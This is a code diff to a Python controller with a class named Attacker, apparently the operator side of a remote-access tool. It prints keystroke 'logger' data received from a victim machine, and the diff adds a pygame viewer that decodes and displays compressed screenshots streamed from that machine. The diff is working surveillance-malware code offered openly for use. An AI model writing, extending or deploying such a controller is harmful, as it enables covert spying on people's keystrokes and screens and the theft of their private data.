@@ -1,7 +1,13 @@
 import socket
 import struct
 import json
+import base64
+import pygame
+from zlib import decompress
 
+
+WIDTH = 1900
+HEIGHT = 1000
 
 class Attacker():
     def __init__(self):
@@ -14,8 +20,9 @@ class Main():
     def __init__(self, client_socket):
         self.client_socket = client_socket
         SuperSocket(self.client_socket).send_msg(("1").encode())
+        self.screen_cap = Screen()
         self.operation()
-
+        
     def operation(self):
         while True:
             data = (SuperSocket(self.client_socket).recv_msg()).decode()
@@ -24,8 +31,37 @@ class Main():
             if message["type"] == "logger":
                 print(message["data"])
                 
+            elif message["type"] == "screen":
+                self.screen_cap.show(message["data"])
             else:
                 print("wrong")
+
+class Screen():
+    def __init__(self):
+        pygame.init()
+        self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
+        self.clock = pygame.time.Clock()
+        self.watching = True
+        
+    def show(self, encoded_image):
+        self.encoded_image = encoded_image
+        try:
+            for event in pygame.event.get():
+                if event.type == pygame.QUIT:
+                    self.watching = False
+                    break
+                
+            image_bytes = base64.b64decode(self.encoded_image)
+            decompressed_pixels = decompress(image_bytes)
+
+            img = pygame.image.fromstring(decompressed_pixels, (WIDTH, HEIGHT), 'RGB')
+
+            self.screen.blit(img, (0, 0))
+            pygame.display.flip()
+            self.clock.tick(60)
+        except:
+            print("error")
+
 
 class SuperSocket():
     def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
